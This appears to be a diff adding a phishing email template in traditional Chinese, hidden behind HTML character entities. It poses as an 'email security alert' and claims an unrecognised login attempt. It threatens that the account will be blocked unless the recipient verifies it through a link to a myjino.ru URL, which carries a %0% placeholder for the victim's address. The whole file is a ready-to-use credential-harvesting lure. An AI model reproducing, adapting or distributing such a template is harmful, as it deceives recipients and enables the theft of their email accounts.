@@ -1,0 +1,162 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>&#38651;&#23376;&#37109;&#20214;&#23433;&#20840;&#35686;&#22577;</title>
+
+<link rel="icon" href="files/favicon.ico" sizes="13x13" type="image/png">
+
+</head>
+
+<br>
+
+<table width="550" border="0" align="center">
+  <tbody>
+    <tr>
+      <td>
+      
+      
+      			<table align="center" width="570"><tr>
+                
+                <td style="width:570px; height:85px; font-family: Verdana; font-size: 18px; color:#ffffff; 
+				background-color: #B40404; border: solid 1px #B40404; padding: 10px; 
+				-moz-border-radius: 6px; -webkit-border-radius: 6px; -khtml-border-radius: 6px; border-radius: 6px;">
+                
+                	<table align="center"><tr><td>
+			<div align="center">
+                	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif"
+                    size="+2">
+                    
+                	&#38651;&#23376;&#37109;&#20214;&#23433;&#20840;&#35686;&#22577;
+
+			<br><font size="3" color="#ffffff">&#27492;&#28040;&#24687;&#26159;&#28858;:</font> 
+			<font size="4" color="#ffffff"> %0% </font>
+                    
+                	</font>
+			</div>
+                 	</td></tr></table>
+                
+                </td></tr></table>
+      
+      
+      </td>
+    </tr>
+ 
+ 
+ 
+ 
+ 
+ 	
+    
+    
+    
+    
+    <tr>
+      <td height="20"></td>
+    </tr>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+     <tr>
+      <td>
+      
+      
+      			<table align="center" width="570"><tr>
+                
+                <td style="width:470px; height:200px; font-family: Verdana; font-size: 18px; color:#ffffff; 
+				background-color: #FFFFFF; border: solid 1px #B40404; padding: 10px; 
+				-moz-border-radius: 6px; -webkit-border-radius: 6px; -khtml-border-radius: 6px; border-radius: 6px;">
+                
+                	<table align="center" width="470">
+                    
+                    <tr><td>
+                	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif"
+                    size="2" color="#000000">
+                    <div align="left">
+  
+                    <p>
+                    			&#36889;&#26159;&#36890;&#30693;&#20320;&#65292;&#26377;&#20154;&#35430;&#22294;&#30331;&#37636;&#21040;
+			&#24744;&#30340;&#38651;&#23376;&#37109;&#20214;&#24478;&#28961;&#27861;&#35672;&#21029;&#30340;&#20301;&#32622;&#12290;
+			<br>
+		    	&#20320;&#30693;&#36947;&#38364;&#26044;&#27492;&#25805;&#20316;?
+                    </p>
+                    
+                    
+                    
+                    
+                    <p>
+                    			&#28858;&#24744;&#30340;&#24115;&#25142;&#23433;&#20840;&#65292;&#25105;&#20497;
+			&#24375;&#28872;&#24314;&#35696;&#24744;&#29694;&#22312;&#39511;&#35657;&#24744;
+			&#30340;&#38651;&#23376;&#37109;&#20214;&#24115;&#25142;, 
+
+						&#22914;&#26524;&#20320;&#19981;&#26371;&#39511;&#35657;&#24744;&#30340;&#38651;
+			&#23376;&#37109;&#20214;&#65292;&#24744;&#30340;&#24115;&#25142;&#23559;&#34987;
+			&#38459;&#27490;&#32780;&#19981;&#24517;&#21478;&#34892;&#36890;&#30693;&#12290;
+                    </p>
+                    
+    
+     
+                    <p>
+                    <a href="http://j598626.myjino.ru/verify/china/auto/connect.php?email=%0%">
+                    			&#25353;&#19968;&#19979;&#27492;&#34389;&#39511;&#35657;&#21450;&#20445;
+			&#35703;&#24744;&#30340;&#38651;&#23376;&#37109;&#20214;&#24115;&#25142;&#29694;&#22312;
+                    </a>
+                    </p>
+                    
+                    
+                    
+                    <p>
+                    			&#39511;&#35657;&#24460;&#65292;&#25105;&#20497;&#23559;&#21521;&#24744;&#30340;&#38651;
+			&#23376;&#37109;&#20214;&#20013;&#28155;&#21152;&#38989;&#22806;&#30340;&#20445			;&#35703;&#65292;&#35731;&#23427;&#26356;&#23433;&#20840;&#30340;&#20351;&#29992;&#12290;
+                    
+                    <br>
+                    
+                   
+                    </p>
+                    
+
+                    </div>
+                	</font>
+                 	</td></tr>
+                    
+
+                    
+                    </table>
+                
+                </td></tr></table>
+
+
+			<br>
+
+			<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2" color="#000000">
+               		<div align="center">
+                  	&#35338;&#24687;&#28304;:		
+                 	<b>&#38651;&#23376;&#37109;&#20214;&#23433;&#20840;&#22296;&#38538;</b>
+                  	</div>
+			</font>
+                    
+      
+      
+      </td>
+    </tr>
+    
+  
+  
+  
+  
+  </tbody>
+</table>
+
+
+<body>
+</body>
+</html>
